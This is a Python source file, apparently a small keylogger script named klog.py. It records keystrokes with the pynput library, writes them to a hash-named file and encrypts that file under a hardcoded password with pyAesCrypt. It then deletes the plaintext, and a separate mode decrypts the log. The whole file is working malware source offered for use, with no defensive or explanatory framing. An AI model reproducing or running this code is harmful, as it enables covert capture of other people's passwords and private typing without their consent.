import pynput
import time
import hashlib
import pyAesCrypt
import os
import argparse

keystrokes = []
ENCRYPTION_PASSWORD = 'Elm34lp9Avm43l2C3n4lkmM1kQwe'

def begin_capture():
    with pynput.keyboard.Listener(on_press = capture_keystroke) as listener:
        listener.join()

def capture_keystroke(key):
    try:
        keystrokes.append(str(key.char))
    except AttributeError:
        keystrokes.append(str(key)[4:])
    if len(keystrokes) == 10:
        return False

def record_keystrokes(filename):
    with open(filename, "w") as outfile:
        for stroke in keystrokes:
            outfile.write(stroke + "\n")

def encrypt_file(filename, password):
    with open(filename, "rb") as infile:
        with open(filename[:-4] + ".aes", "wb") as outfile:
            pyAesCrypt.encryptStream(infile, outfile, password, (64 * 1024))

def clean_up(filename):
    os.remove(filename)

def decrypt(filename, password):
    with open(filename, "rb") as infile:
        with open(filename[:-4] + ".txt", "wb") as outfile:
            try:
                pyAesCrypt.decryptStream(infile, outfile, password, (64 * 1024), os.stat(filename).st_size)
            except ValueError:
                os.remove(filename[:-4] + ".txt")

def Main():
    parser = argparse.ArgumentParser(description = "command-line args")
    parser.add_argument("-m", "--mode", help="'capture' keystrokes or 'decrypt' log file")
    parser.add_argument("-f", "--filename", help="name of log file to decrypt")
    args = parser.parse_args()

    if args.mode == "capture":
        filename = hashlib.sha1(str(time.time()).encode()).hexdigest() + ".txt"
        begin_capture()
        record_keystrokes(filename)
        encrypt_file(filename, ENCRYPTION_PASSWORD)
        clean_up(filename)
    elif args.mode == "decrypt" and args.filename is not None:
        decrypt(args.filename, ENCRYPTION_PASSWORD)
    else:
        print("Usage: python klog.py [mode] [file to decrypt]")

if __name__ == '__main__':
    Main()
